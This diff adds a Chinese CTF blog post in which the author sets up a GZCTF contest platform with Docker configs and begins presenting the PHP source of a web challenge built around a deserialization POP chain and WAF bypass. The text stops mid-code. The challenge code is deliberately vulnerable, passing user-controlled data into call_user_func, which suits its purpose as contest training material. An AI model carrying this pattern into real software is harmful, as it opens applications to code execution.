@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。 0x00 前言记录一下第一次当CTF出题人">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次CTF院赛web方向出题">
+<meta property="og:url" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/index.html">
+<meta property="og:site_name" content="YDJ&#39;s_Bl0g">
+<meta property="og:description" content="声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。 0x00 前言记录一下第一次当CTF出题人">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984774-18.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-1.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-2.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-3.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/image-20231204152710572.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/image-20231204152718960.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-4.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-5.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-6.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/image-20231204152746833.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-7.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-8.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-9.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-10.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-11.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-12.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-13.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-14.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-15.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-16.png">
+<meta property="og:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-17.png">
+<meta property="article:published_time" content="2023-12-02T19:21:26.000Z">
+<meta property="article:modified_time" content="2023-12-06T10:47:29.254Z">
+<meta property="article:author" content="YDJ">
+<meta property="article:tag" content="出题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984774-18.png">
+
+<link rel="canonical" href="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>记一次CTF院赛web方向出题 | YDJ's_Bl0g</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">YDJ's_Bl0g</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>日志</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="YDJ">
+      <meta itemprop="description" content="我这一生，如履薄冰">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YDJ's_Bl0g">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记一次CTF院赛web方向出题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-12-03 03:21:26" itemprop="dateCreated datePublished" datetime="2023-12-03T03:21:26+08:00">2023-12-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-12-06 18:47:29" itemprop="dateModified" datetime="2023-12-06T18:47:29+08:00">2023-12-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>记录一下第一次当CTF出题人</p>
+<span id="more"></span>
+
+<h1 id="0x01-基于GZCTF的比赛平台搭建"><a href="#0x01-基于GZCTF的比赛平台搭建" class="headerlink" title="0x01 基于GZCTF的比赛平台搭建"></a>0x01 基于GZCTF的比赛平台搭建</h1><h2 id="1-1-测试服务器（ubantu）环境准备"><a href="#1-1-测试服务器（ubantu）环境准备" class="headerlink" title="1.1 测试服务器（ubantu）环境准备"></a>1.1 测试服务器（ubantu）环境准备</h2><ul>
+<li>Docker</li>
+</ul>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>docker-compose</li>
+</ul>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-GZCTF平台部署"><a href="#1-2-GZCTF平台部署" class="headerlink" title="1.2 GZCTF平台部署"></a>1.2 GZCTF平台部署</h2><p>github地址：<a target="_blank" rel="noopener" href="https://github.com/GZTimeWalker/GZCTF">https://github.com/GZTimeWalker/GZCTF</a></p>
+<p>手册：<a target="_blank" rel="noopener" href="https://docs.ctf.gzti.me/">https://docs.ctf.gzti.me/</a></p>
+<p>步骤：</p>
+<p>在服务器新建一个目录用来放GZCTF的核心配置文件appsettings.json和docker-compose.yml文件</p>
+<ul>
+<li>appsettings.json</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=**********&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;SendMailAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a@a.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">587</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Your XOR_KEY&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Docker&quot;</span><span class="punctuation">,</span> <span class="comment">// or &quot;Kubernetes&quot;</span></span><br><span class="line">      <span class="attr">&quot;PortMappingType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span> <span class="comment">// or &quot;PlatformProxy&quot;</span></span><br><span class="line">      <span class="attr">&quot;EnableTrafficCapture&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;139.9.216.132&quot;</span><span class="punctuation">,</span> <span class="comment">// or &quot;xxx.xxx.xxx.xxx&quot;</span></span><br><span class="line">      <span class="comment">// optional</span></span><br><span class="line">      <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unix:///var/run/docker.sock&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RegistryConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;ServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;CaptchaConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Provider&quot;</span><span class="punctuation">:</span> <span class="string">&quot;None&quot;</span><span class="punctuation">,</span> <span class="comment">// or &quot;CloudflareTurnstile&quot; or &quot;GoogleRecaptcha&quot;</span></span><br><span class="line">      <span class="attr">&quot;SiteKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Your SITE_KEY&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;SecretKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Your SECRET_KEY&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="comment">// optional</span></span><br><span class="line">      <span class="attr">&quot;GoogleRecaptcha&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;VerifyAPIAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;RecaptchaThreshold&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.5&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里比较重要的是要确认好数据库密码和服务器地址</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984774-18.png" alt="img"></p>
+<ul>
+<li>docker-compose.yml</li>
+</ul>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&quot;3.0&quot;</span></span><br><span class="line">services:</span><br><span class="line">  gzctf:</span><br><span class="line">    image: gztime/gzctf:latest</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - <span class="string">&quot;GZCTF_ADMIN_PASSWORD=**********&quot;</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;80:80&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;./data/files:/app/files&quot;</span></span><br><span class="line">      - <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="comment"># - &quot;./k8sconfig.yaml:/app/k8sconfig.yaml:ro&quot; # this is required for k8s deployment</span></span><br><span class="line">      - <span class="string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span> <span class="comment"># this is required for docker deployment</span></span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: postgres:alpine</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - <span class="string">&quot;POSTGRES_PASSWORD=**********&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里比较重要的则是数据库密码和上面对应，然后设置好管理员密码，账号默认Admin</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-1.png" alt="img"></p>
+<p>编辑好后在该目录下docker-compose一键启动即可</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-2.png" alt="img"></p>
+<p>访问服务器80端口，管理员账号密码：Admin&#x2F;&lt;docker-compose.yml里设置的密码&gt;，即可登录</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-3.png" alt="img"></p>
+<h1 id="0x02-部分web赛题"><a href="#0x02-部分web赛题" class="headerlink" title="0x02 部分web赛题"></a>0x02 部分web赛题</h1><p>赛题方面五我负责的是两道web题，相对于院内的同学来说应该是一道中等，一道偏难</p>
+<h2 id="2-1-web"><a href="#2-1-web" class="headerlink" title="2.1 web"></a>2.1 web</h2><h3 id="2-1-1-Study-And-Share"><a href="#2-1-1-Study-And-Share" class="headerlink" title="2.1.1 Study_And_Share"></a>2.1.1 Study_And_Share</h3><p>考点：php反序列化pop链构造，双写绕waf</p>
+<p>本题源自[2023羊城杯]D0n’t pl4y g4m3!!!，考虑到是院赛，院里打CTF的同学并不多，所以二开的时候尽量去除了一些冗余的代码和干扰项，保留了核心考点，然后加了一个文件包含读取waf源码的简单考点</p>
+<h4 id="2-1-1-1-源码"><a href="#2-1-1-1-源码" class="headerlink" title="2.1.1.1 源码"></a>2.1.1.1 源码</h4><ul>
+<li>index.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>); <span class="comment">//hint.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Study</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sas</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fl4g-&gt;fl4g;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fl4g-&gt;fl4g) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;ary2[<span class="variable">$func</span>], <span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">        